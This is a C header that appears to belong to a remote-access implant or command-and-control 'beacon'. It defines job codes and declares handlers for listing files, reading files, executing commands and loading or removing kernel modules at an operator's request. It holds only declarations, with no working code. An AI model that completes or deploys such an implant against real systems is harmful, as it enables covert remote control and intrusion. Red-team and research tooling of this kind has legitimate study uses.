#ifndef __INCLUDE_COMMAND_H__
#define __INCLUDE_COMMAND_H__

#include "command_ls.h"
#include "command_cat.h"
#include "command_insmod.h"
#include "command_lsmod.h"
#include "command_rmmod.h"
#include "command_usemod.h"
#include "command_modinfo.h"
#include "command_exec.h"
#include "common.h"
#include "beacon.h"
#include "packet_parser.h"

#define COMMAND_GET_JOB 1
#define COMMAND_NO_JOB 2
#define COMMAND_LS 3
#define COMMAND_CAT 4
#define COMMAND_INSMOD 5
#define COMMAND_EXEC 6
#define COMMAND_RMMOD 7
#define COMMAND_MODINFO 8
#define COMMAND_LSMOD   9
#define COMMAND_USEMOD  10
#define COMMAND_DMESG   11

int handle_cat(BEACONINFO *beaconInfo, struct packet_parser_struct *parser);
int handle_ls(BEACONINFO *beaconInfo, struct packet_parser_struct *parser);
int handle_exec(BEACONINFO *beaconInfo,struct packet_parser_struct *parser);
int handle_insmod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser);
int handle_lsmod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser);
int handle_rmmod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser);
int handle_modinfo(BEACONINFO *beaconInfo,struct packet_parser_struct *parser);
int handle_usemod(BEACONINFO *beaconInfo,struct packet_parser_struct *parser);

#endif